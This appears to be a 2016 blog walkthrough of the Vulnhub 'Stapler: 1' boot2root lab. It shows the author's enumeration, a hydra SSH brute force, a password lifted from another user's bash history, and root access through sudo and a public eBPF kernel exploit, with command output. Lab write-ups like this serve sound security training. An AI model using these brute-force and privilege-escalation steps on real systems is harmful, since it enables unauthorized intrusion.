@@ -1,0 +1,568 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Stapler: 1 - tick.Tack</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="Stapler: 1 from Vulnhub Nmap scan result Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2016-06-17 12:29 CST
+Warning: 192.168.0.108 giving up on &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2016/06/17/stapler_1/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tick.Tack</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Stapler: 1</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-06-17T12:22:45+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>12:22 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="https://www.vulnhub.com/entry/stapler-1,150/">Stapler: 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<p>Nmap scan result</p>
+
+<pre><code>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2016-06-17 12:29 CST
+Warning: 192.168.0.108 giving up on port because retransmission cap hit (2).
+Nmap scan report for 192.168.0.108
+Host is up (0.00035s latency).
+Not shown: 992 filtered ports
+PORT     STATE  SERVICE
+20/tcp   closed ftp-data
+21/tcp   open   ftp
+22/tcp   open   ssh
+53/tcp   open   domain
+80/tcp   open   http
+139/tcp  open   netbios-ssn
+666/tcp  open   doom
+3306/tcp open   mysql
+12380/tcp 
+MAC Address: 08:00:27:F5:FB:B3 (Cadmus Computer Systems)
+
+Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
+</code></pre>
+
+<p>The <a href="https://www.vulnhub.com/entry/stapler-1,150/#description">description</a> says that:</p>
+
+<pre><code>There are multiple methods to-do this machine
+At least two (2) paths to get a limited shell
+At least three (3) ways to get a root access
+</code></pre>
+
+<h2>Limited shell 1</h2>
+
+<p>I used enum4linux to test the 139 port, which gave me the users on this machine.</p>
+
+<pre><code>...snip...
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\peter (Local User)
+S-1-22-1-1001 Unix User\RNunemaker (Local User)
+S-1-22-1-1002 Unix User\ETollefson (Local User)
+S-1-22-1-1003 Unix User\DSwanger (Local User)
+S-1-22-1-1004 Unix User\AParnell (Local User)
+S-1-22-1-1005 Unix User\SHayslett (Local User)
+S-1-22-1-1006 Unix User\MBassin (Local User)
+S-1-22-1-1007 Unix User\JBare (Local User)
+S-1-22-1-1008 Unix User\LSolum (Local User)
+S-1-22-1-1009 Unix User\IChadwick (Local User)
+S-1-22-1-1010 Unix User\MFrei (Local User)
+S-1-22-1-1011 Unix User\SStroud (Local User)
+S-1-22-1-1012 Unix User\CCeaser (Local User)
+S-1-22-1-1013 Unix User\JKanode (Local User)
+S-1-22-1-1014 Unix User\CJoo (Local User)
+S-1-22-1-1015 Unix User\Eeth (Local User)
+S-1-22-1-1016 Unix User\LSolum2 (Local User)
+S-1-22-1-1017 Unix User\JLipps (Local User)
+S-1-22-1-1018 Unix User\jamie (Local User)
+S-1-22-1-1019 Unix User\Sam (Local User)
+S-1-22-1-1020 Unix User\Drew (Local User)
+S-1-22-1-1021 Unix User\jess (Local User)
+S-1-22-1-1022 Unix User\SHAY (Local User)
+S-1-22-1-1023 Unix User\Taylor (Local User)
+S-1-22-1-1024 Unix User\mel (Local User)
+S-1-22-1-1025 Unix User\kai (Local User)
+S-1-22-1-1026 Unix User\zoe (Local User)
+S-1-22-1-1027 Unix User\NATHAN (Local User)
+S-1-22-1-1028 Unix User\www (Local User)
+S-1-22-1-1029 Unix User\elly (Local User)
+...snip...
+</code></pre>
+
+<p>Then I compsed these names into a file, then tried to brute force with it for both user name and password on the ssh service.</p>
+
+<pre><code># grep 'Unix User' e4l_result | cut -d'\' -f2 | cut -d' ' -f1 &gt; user_list
+# hydra -L user_list -P user_list 192.168.0.108 ssh
+
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-06-17 13:42:48
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 900 login tries (l:30/p:30), ~0 tries per task
+[DATA] attacking service ssh on port 22
+[22][ssh] host: 192.168.0.108   login: SHayslett   password: SHayslett
+</code></pre>
+
+<p>Here we got SHayslett who set the password the same as the username. Now we can login the ssh with this credential.</p>
+
+<pre><code>ssh SHayslett@192.168.0.108
+-----------------------------------------------------------------
+~          Barry, don't forget to put a message here           ~
+-----------------------------------------------------------------
+SHayslett@192.168.0.108's password:
+Welcome back!
+
+
+SHayslett@red:~$ id
+uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
+SHayslett@red:~$
+</code></pre>
+
+<h2>Privilege Escalation 1</h2>
+
+<p>After logged in as SHayslett, I found it is available to browse every users&#8217; home directory.</p>
+
+<pre><code>SHayslett@red:/home$ ls -al
+total 128
+drwxr-xr-x 32 root       root       4096 Jun  4 20:13 .
+drwxr-xr-x 22 root       root       4096 Jun  7 09:08 ..
+drwxr-xr-x  2 AParnell   AParnell   4096 Jun  5 18:21 AParnell
+drwxr-xr-x  2 CCeaser    CCeaser    4096 Jun  5 18:26 CCeaser
+drwxr-xr-x  2 CJoo       CJoo       4096 Jun  5 18:24 CJoo
+drwxr-xr-x  2 Drew       Drew       4096 Jun  5 18:24 Drew
+drwxr-xr-x  2 DSwanger   DSwanger   4096 Jun  5 18:24 DSwanger
+drwxr-xr-x  2 Eeth       Eeth       4096 Jun  5 18:24 Eeth
+drwxr-xr-x  2 elly       elly       4096 Jun  5 18:24 elly
+drwxr-xr-x  2 ETollefson ETollefson 4096 Jun  5 18:24 ETollefson
+drwxr-xr-x  2 IChadwick  IChadwick  4096 Jun  5 18:24 IChadwick
+drwxr-xr-x  2 jamie      jamie      4096 Jun  5 18:26 jamie
+drwxr-xr-x  2 JBare      JBare      4096 Jun  5 18:24 JBare
+drwxr-xr-x  2 jess       jess       4096 Jun  5 18:24 jess
+drwxr-xr-x  2 JKanode    JKanode    4096 Jun  5 18:25 JKanode
+drwxr-xr-x  2 JLipps     JLipps     4096 Jun  5 18:26 JLipps
+drwxr-xr-x  2 kai        kai        4096 Jun  5 18:24 kai
+drwxr-xr-x  2 LSolum     LSolum     4096 Jun  5 18:24 LSolum
+drwxr-xr-x  2 LSolum2    LSolum2    4096 Jun  5 18:26 LSolum2
+drwxr-xr-x  2 MBassin    MBassin    4096 Jun  5 18:24 MBassin
+drwxr-xr-x  2 mel        mel        4096 Jun  5 18:24 mel
+drwxr-xr-x  2 MFrei      MFrei      4096 Jun  5 18:24 MFrei
+drwxr-xr-x  2 NATHAN     NATHAN     4096 Jun  5 18:24 NATHAN
+drwxr-xr-x  3 peter      peter      4096 Jun  3 16:11 peter
+drwxr-xr-x  2 RNunemaker RNunemaker 4096 Jun  5 18:24 RNunemaker
+drwxr-xr-x  2 Sam        Sam        4096 Jun  5 18:24 Sam
+drwxr-xr-x  2 SHAY       SHAY       4096 Jun  5 18:24 SHAY
+drwxr-xr-x  3 SHayslett  SHayslett  4096 Jun 17 13:04 SHayslett
+drwxr-xr-x  2 SStroud    SStroud    4096 Jun  5 18:24 SStroud
+drwxr-xr-x  2 Taylor     Taylor     4096 Jun  5 18:26 Taylor
+drwxrwxrwx  2 www        www        4096 Jun  5 18:25 www
+drwxr-xr-x  2 zoe        zoe        4096 Jun  5 18:26 zoe
+SHayslett@red:/home$
+</code></pre>
+
+<p>Let&rsquo;s check if there&rsquo;s any interesting stuff in them.</p>
+
+<pre><code>SHayslett@red:/home$ ls -alR | grep -v .bash_logout | grep -v .bashrc |grep -v .profile
+...snip...
+./JKanode:
+total 24
+drwxr-xr-x  2 JKanode JKanode 4096 Jun  5 18:25 .
+drwxr-xr-x 32 root    root    4096 Jun  4 20:13 ..
+-rw-r--r--  1 JKanode JKanode  167 Jun  5 18:25 .bash_history
+...snip...
+</code></pre>
+
+<p>We found something different in JKanode&rsquo;s and peter&rsquo;s home directory.</p>
+
+<p>Let&rsquo;s take a look at the .bash_history in JKanode</p>
+
+<pre><code>SHayslett@red:/home/JKanode$ cat .bash_history
+id
+whoami
+ls -lah
+pwd
+ps aux
+sshpass -p thisimypassword ssh JKanode@localhost
+apt-get install sshpass
+sshpass -p JZQuyIN5 peter@localhost
+ps -ef
+top
+kill -9 3747
+exit
+SHayslett@red:/home/JKanode$
+</code></pre>
+
+<p>Looks like we found peter&rsquo;s password here. Now it&rsquo;s time to switch to peter&rsquo;s account.</p>
+
+<pre><code>SHayslett@red:/home/JKanode$ ssh peter@localhost
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+-----------------------------------------------------------------
+~          Barry, don't forget to put a message here           ~
+-----------------------------------------------------------------
+peter@localhost's password:
+Welcome back!
+This is the Z Shell configuration function for new users,
+zsh-newuser-install.
+You are seeing this message because you have no zsh startup files
+(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
+~).  This function can help you with a few settings that should
+make your use of the shell easier.
+
+You can:
+
+(q)  Quit and do nothing.  The function will be run again next time.
+
+(0)  Exit, creating the file ~/.zshrc containing just a comment.
+     That will prevent this function being run again.
+
+(1)  Continue to the main menu.
+
+(2)  Populate your ~/.zshrc with the configuration recommended
+     by the system administrator and exit (you will need to edit
+     the file by hand, if so desired).
+
+--- Type one of the keys in parentheses ---q
+%red id
+uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+red%
+</code></pre>
+
+<p>Now we are logged in as peter. And let&rsquo;s check the home directory first.</p>
+
+<pre><code>red% ls -al
+total 72
+drwxr-xr-x  3 peter peter  4096 Jun  3 16:11 .
+drwxr-xr-x 32 root  root   4096 Jun  4 20:13 ..
+-rw-------  1 peter peter     1 Jun  5 18:00 .bash_history
+-rw-r--r--  1 peter peter   220 Jun  3 13:53 .bash_logout
+-rw-r--r--  1 peter peter  3771 Jun  3 13:53 .bashrc
+drwx------  2 peter peter  4096 Jun  6 23:17 .cache
+-rw-r--r--  1 peter peter   675 Jun  3 13:53 .profile
+-rw-r--r--  1 peter peter     0 Jun  3 13:55 .sudo_as_admin_successful
+-rw-------  1 peter peter   577 Jun  3 14:11 .viminfo
+-rw-rw-r--  1 peter peter 39206 Jun  3 16:11 .zcompdump
+</code></pre>
+
+<p>&lsquo;.sudo_as_admin_successful&rsquo;</p>
+
+<p>Looks like peter has sudo access before. Let&rsquo;s give it a try.</p>
+
+<pre><code>red% sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for peter:
+Matching Defaults entries for peter on red:
+    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User peter may run the following commands on red:
+    (ALL : ALL) ALL
+</code></pre>
+
+<p>It seems that peter is granted access to all commands. Now we can logged in as root simply and get the flag!</p>
+
+<pre><code>red% sudo su
+➜  peter id
+uid=0(root) gid=0(root) groups=0(root)
+➜  peter cat /root/flag.txt
+~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+</code></pre>
+
+<h2>Privilege Escalation 2</h2>
+
+<p>Let&rsquo;s check the system information first.</p>
+
+<pre><code>red% uname -a
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
+red% cat /etc/os-release
+NAME="Ubuntu"
+VERSION="16.04 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+UBUNTU_CODENAME=xenial
+</code></pre>
+
+<p>It can be easily pwnd with the <a href="https://www.exploit-db.com/exploits/39772/">exploit</a> found on exploit-db.</p>
+
+<pre><code>red% ./compile.sh
+doubleput.c: In function ‘make_setuid’:
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)""
+               ^
+red% ./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+root@red:~/ebpf_mapfd_doubleput_exploit# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare),1000(peter)
+root@red:~/ebpf_mapfd_doubleput_exploit# cat /root/flag.txt
+~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+</code></pre>
+
+<h2>Ongoing Attempts</h2>
+
+<p><strong>Port 666</strong></p>
+
+<p>After connecting to port 666 with nc, it response with a stream of data then closed the connection.</p>
+
+<p>I tried to direct the stream to a output file. It turns out that it is a zip file, which contains a image call message2.jpg.</p>
+
+<pre><code># nc 192.168.0.108 666 &gt; output
+# file output
+output: Zip archive data, at least v2.0 to extract
+# unzip output
+Archive:  output
+  inflating: message2.jpg
+</code></pre>
+
+<p><img class="center" src="/images/2016-06-17-stapler_1/message2.jpg"></p>
+
+<p>Then I got a cookie by searching strings in it&hellip;.</p>
+
+<pre><code># strings message2.jpg
+JFIF
+vPhotoshop 3.0
+8BIM
+1If you are reading this, you should get a cookie!
+---snip---
+</code></pre>
+
+<hr />
+
+<p><strong>Port 80</strong></p>
+
+<p>The web sever is setup by using the php command directly.</p>
+
+<pre><code>red% ps aux
+---snip--- 
+root      1409  0.0  0.2   6472  3060 ?        S    11:07   0:00 su -c authbind php -S 0.0.0.0:80 -t /home/www/ &amp;&gt;/dev/null www
+---snip---
+</code></pre>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2016-06-17T12:22:45+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>12:22 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2016/06/17/stapler_1/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2016/06/17/stapler_1/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2016/05/03/google_advanced_search_operators/" title="Previous Post: Google Adavanced Search Operators">&laquo; Google Adavanced Search Operators</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>最近文章</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/06/17/stapler_1/">Stapler: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/05/03/google_advanced_search_operators/">Google Adavanced Search Operators</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/26/lord_of_root/">Lord of the Root</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/23/pipe/">/dev/random: Pipe</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/20/sleepy/">/dev/random: Sleepy</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
